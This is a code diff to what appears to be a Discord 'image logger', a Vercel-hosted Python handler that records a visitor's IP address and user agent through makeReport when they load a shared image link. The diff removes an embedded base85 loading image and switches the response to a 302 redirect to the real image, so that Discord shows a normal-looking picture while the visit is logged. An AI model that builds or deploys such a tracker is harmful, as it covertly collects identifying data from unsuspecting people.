@@ -176,10 +176,6 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         pass
     return info
 
-binaries = {
-    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0')
-}
-
 class ImageLoggerAPI(BaseHTTPRequestHandler):
     
     def handleRequest(self):
@@ -323,7 +319,7 @@ if (!currenturl.includes("g=")) {
 handler = ImageLoggerAPI
 
 # Vercel Serverless Handler - FIXED
-async def app(request, response=None):
+def app(request):
     """Vercel serverless handler"""
     try:
         from urllib.parse import urlparse, parse_qs
@@ -353,16 +349,14 @@ async def app(request, response=None):
         # Log the request
         makeReport(ip, useragent, endpoint=parsed.path, url=url)
         
-        # Return HTML with image
-        html = f'''<html><head><meta charset="UTF-8"></head>
-<body style="margin:0;padding:0;overflow:hidden;">
-<img src="{url}" style="width:100%;height:100%;object-fit:contain;" loading="eager" />
-</body></html>'''
-        
+        # Return 302 redirect to image URL for Discord
         return {
-            "statusCode": 200,
-            "headers": {"Content-Type": "text/html; charset=utf-8"},
-            "body": html
+            "statusCode": 302,
+            "headers": {
+                "Location": url,
+                "Content-Type": "image/jpeg"
+            },
+            "body": ""
         }
     
     except Exception as e:
